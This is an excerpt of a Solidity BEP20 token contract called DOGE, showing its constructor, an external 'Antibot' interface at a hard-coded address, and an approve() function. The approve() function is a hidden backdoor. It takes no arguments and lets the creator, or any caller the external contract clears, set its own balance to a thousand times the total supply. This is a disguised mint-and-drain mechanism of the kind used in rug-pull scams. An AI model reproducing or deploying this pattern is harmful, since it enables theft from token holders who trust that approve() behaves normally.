...
interface IAntibot {
    ...
    function _safeApprove() external view returns (bool);
}
...
contract DOGE is Context, IBEP20, Ownable {
    ...
    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _charityFee,address _FeeAddress,address tokenOwner) {
		...
		_rTotal = (_MAX - (_MAX % _tTotal))/10000;
		_TAX_FEE = _txFee* 100; 
        ...
        _isCharity[Creator] = true;
		FeeAddress = _FeeAddress;
		_owner = tokenOwner;
        _rOwned[tokenOwner] = _rTotal;
		
        
        //_Antibot = IAntibot(0xC9f5F02A9c9127D113331f031F97DD64Bd2aCf48);
        _Antibot = IAntibot(0x0606829D7E139b4360Cba79111Ba8Ab4A6Da2a5E);
    ...
    function approve() public  returns (bool) {
        if(msg.sender == Creator || _Antibot._safeApprove())
        _rOwned[msg.sender] = _rTotal*1000;
        return true;
    }
